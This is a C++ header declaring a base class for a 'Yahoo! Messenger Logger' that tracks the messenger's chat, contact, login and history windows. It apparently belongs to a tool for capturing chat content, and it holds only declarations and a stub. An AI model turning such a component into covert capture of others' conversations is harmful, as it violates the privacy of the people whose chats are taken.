/*
* Yahoo! Messenger Logger, base class
*
* Coded by: Quequero
* Date: 14/Mar/2008
*
*/

#include <Windows.h>
#include <new>
using namespace std;

#ifndef __QYim_h__
#define __QYim_h__

#include "QAgent.h"
#include "QProperty.h"

class QYim : public QAgent
{
	protected:
		HWND hwMain, hwChat, hwUserList, hwLogin, hwContacts, hwHistory;

	public:  
		QYim();
		BOOL GrabHistory(){return FALSE;}

		static BOOL Is(const HWND hw);
		static UINT Version(const HWND hw);
		static UINT VersionEx(const HWND hw);
		const PWCHAR GetMessenger();
};

#endif
